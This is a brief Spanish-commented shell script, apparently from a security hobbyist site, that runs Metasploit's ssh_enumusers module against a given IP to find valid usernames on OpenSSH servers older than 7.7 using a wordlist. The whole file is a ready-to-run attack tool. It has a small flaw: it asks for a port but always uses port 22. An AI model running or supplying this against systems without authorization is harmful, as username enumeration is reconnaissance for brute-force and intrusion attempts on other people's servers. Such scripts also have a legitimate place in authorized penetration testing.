
# Antonio Taboada - hackingyseguridad.com 2025
# OpenSSH < 7.7 - User Enumeration
# Descargar diccionario de usuarios
# sh /home/antonio/ssha/actualizar.sh

echo " # # # Descubre usuarios # # #"
echo "uso.: ./usuarios.sh IP puerto"
echo

msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $1;set RPORT 22; set USER_FILE /home/antonio/ssha/usuarios.txt; run"

echo ".."
echo

